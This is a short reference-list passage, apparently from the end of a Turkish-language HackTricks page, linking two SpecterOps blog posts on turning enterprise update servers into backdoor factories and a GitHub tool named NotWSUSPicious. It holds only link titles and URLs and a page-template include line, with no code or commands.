- [38] [SpecterOps – Enterprise Update Servers'ı Backdoor Fabrikalarına Dönüştürmek (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update Servers'ı Backdoor Fabrikalarına Dönüştürmek (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
